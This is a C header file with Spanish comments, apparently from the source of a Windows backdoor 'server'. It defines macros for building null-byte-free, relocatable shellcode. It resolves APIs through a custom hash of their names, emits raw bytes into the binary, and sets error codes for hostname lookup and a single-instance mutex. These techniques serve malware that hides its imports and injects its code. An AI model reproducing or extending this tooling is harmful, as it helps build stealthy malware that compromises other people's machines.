/*###############################################################################
** Macros:
**    En este fichero de encabezado estan definidos los macros preprocesador
**    encargados de:
**        *Crear e introducir hashes de las funciones en el fichero binario.
**        *Funciones para introducir BYTE/WORD/DWORD en el fichero binario.
**        *Funci�n encargada de generar los identificadores que situan las
**            direcciones en el 'stack de direcciones'
**        *Compilaci�n condicionada encargada de generar:
**            +Un shellcode libre de bytes nulos
**            +Direcciones relativas que permitan la reubicaci�n del c�digo
**            +Un gestor de errores
*###############################################################################*/

#include "preprocessor/for_each_i.hpp"
#include "preprocessor/fold_left.hpp"
#include "preprocessor/cat.hpp"

/*###############################################################################
** Error_Check:
**    Si se define la compilaci�n ERR_CHECK el c�digo generado tendr�
**    comprobaci�n de errores.
**    NOTA:{
**        Se a�ade c�digo, como consecuencia aumenta el tama�o
**    }
*###############################################################################*/
#define ERR_CHECK
#undef ERR_CHECK

/*###############################################################################
** Control de errores:
**    Constantes utilizadas en el control de errores.
**    Solamente las excepciones cr�ticas ser�n controladas, y
**    se devolver� la constante de error correspondiente como
**    'Exit Code' en ExitProcess()@kernel32
*###############################################################################*/
#define ERR_NO  0x0     //No ha habido ningun error. El server ha finalizado correctamente.
#define ERR_FNC 0x1     //Ha habido un error en la funcion LoadFunctions(). Probablemente alguna funci�n no se ha encontrado.
#define ERR_HST 0x2     //Ha habido un error al resolver el Hostname. Probablemente debido a un problema de conexi�n.
#define ERR_MEM 0x3     //Ha habido un error al reservar memoria.
#define ERR_SUM 0x4     //Ha habido un error en la suma de comprobaci�n.
#define ERR_MTX 0x5     //El server ya est� en ejecuci�n.

/*###############################################################################
** Shellcode:
**    Si se define la compilaci�n en modo 'shellcode' el c�digo generado no tendr�
**    bytes nulos ni direcciones est�ticas.
**    Se diferencian dos modos de shellcode:
**      [+] Direcciones relativas (SC_DELTA)
**      [+] Bytes nulos (SC_NULL)
**    
**    NOTA:{
**        Se a�ade c�digo, como consecuencia aumenta el tama�o
**    }
*###############################################################################*/
#define SC_DELTA
#define SC_NULL
#undef SC_NULL
#undef SC_DELTA

#pragma message("[i] COMPILANDO CON LAS SIGUIENTES FLAGS ACTIVADAS:")

#ifdef ERR_CHECK
    #pragma message("\t\tERR_CHECK")
#endif
#ifdef SC_DELTA
    #pragma message("\t\tSC_DELTA")
#endif
#ifdef SC_NULL
    #pragma message("\t\tSC_NULL")
#endif

/*###############################################################################
** HASH_AND_EMIT:
**    Macro que recibe una secuencia de bytes y genera el hash correspondiente.
**    El algoritmo que gener� el hash es el siguiente:
**      def hash(s):
**          r = 0
**          for x in s:
**              r^=(ord(x)*ord(x))
**          return r
**    Despu�s de generar el hash lo introduce en el binario.
**    El tama�o del hash es de 16 bits (1 WORD)
*###############################################################################*/
#define HASH_AND_EMIT(SEQ) EMIT_WORD(BOOST_PP_SEQ_FOLD_LEFT(CRYPT_BYTE, 0, SEQ))
#define CRYPT_BYTE(s, st, x) (((st)^((x)*(x))))

/*###############################################################################
** EMIT_* :
**    Macros que introducen en el binario diferentes datos
*###############################################################################*/
#define EMIT_BYTE_ARRAY(SEQ) BOOST_PP_SEQ_FOR_EACH_I(EMIT_BYTE_, 0, SEQ)
#define EMIT_BYTE_(r, d, i, e) __asm _emit ((e)&0xFF)
#define EMIT_BYTE(d) EMIT_BYTE_(0, 0, 0, d)
#define EMIT_WORD(d) EMIT_BYTE(((d) >> 0)) EMIT_BYTE(((d) >> 8))
#define EMIT_DWORD(d)EMIT_WORD(((d) >> 0)) EMIT_WORD(((d) >> 16))

/*###############################################################################
** API_DEFINE:
**    Macro que genera el offset de la funci�n en el stack de APIs y calcula su
**    hash.
*###############################################################################*/
#define API_DEFINE(name, SEQ)\
    enum {BOOST_PP_CAT(_, name) = (__COUNTER__*4)};\
    HASH_AND_EMIT(SEQ)
/*###############################################################################
** VAR_DEFINE:
**    Macro que genera el offset de una variable en el stack de APIs.
*###############################################################################*/
#define VAR_DEFINE(name)\
    enum {BOOST_PP_CAT(_, name) = (__COUNTER__*4)};

/*###############################################################################
** CALC_STACKSIZE:
**    Macro que calcula el tama�o del stack de APIs
*###############################################################################*/
#define CALC_STACKSIZE()\
    enum {STACKSIZE = (__COUNTER__*4)};

/*###############################################################################
** Macros de shellcode:
**    Conjunto de macros encargados de evitar direcciones est�ticas y bytes nulos.
**    En caso de no estar activada la compilaci�n 'SHELLCODE' estas caracter�sticas
**    quedan desactivadas.
*###############################################################################*/

#ifdef SC_NULL
    #define K 0xFEEDCAFE
    /*###############################################################################
    ** pushc:
    **    Macro que pushea en el stack una constante y eliminando los bytes nulos
    **    NOTA{Se harcodean los opcodes para ahorrar el opcode de identificador de segmento}
    *###############################################################################*/
    #define pushc(addr)\
        __asm{push ((addr)-K)}\
        __asm{add DWORD PTR[esp], K}
#else //SC_NULL
    #define pushc(addr)\
        __asm{push (addr)}
#endif //SC_NULL

#ifdef SC_DELTA
    #define DELTA __asm{add DWORD PTR[esp], edi}
    /*###############################################################################
    ** movr:
    **    Macro que hace un mov con una direccion estatica y la repara
    **    TODO: COMPROBAR QUE EDI SEA EL DELTA SIEMPRE!!!
    *###############################################################################*/
    #ifdef SC_NULL
        #define movr(r, addr)\
            __asm{lea (r), [edi+((addr)-(K))]}\
            __asm{add (r), (K)}
    #else //SC_NULL
        #define movr(r, addr)\
            __asm{lea (r), [edi+(addr)]}
    #endif //SC_NULL
#else //SC_DELTA
    #define DELTA ;
    /*###############################################################################
    ** movr:
    **    Macro que hace un mov con una direccion estatica y la repara
    **    TODO: COMPROBAR QUE EDI SEA EL DELTA SIEMPRE!!!
    *###############################################################################*/
    #ifdef SC_NULL
        #define movr(r, addr)\
            __asm{mov (r), ((addr)-(K))}\
            __asm{add (r), (K)}
    #else //SC_NULL
        #define movr(r, addr)\
            __asm{mov (r), (addr)}
    #endif //SC_NULL
#endif //SC_DELTA

/*###############################################################################
** pushr:
**    Macro que pushea en el stack una direcci�n estatica y la repara
**    TODO: COMPROBAR QUE EDI SEA EL DELTA SIEMPRE!!!
*###############################################################################*/
#define pushr(addr)\
    pushc((addr))\
    DELTA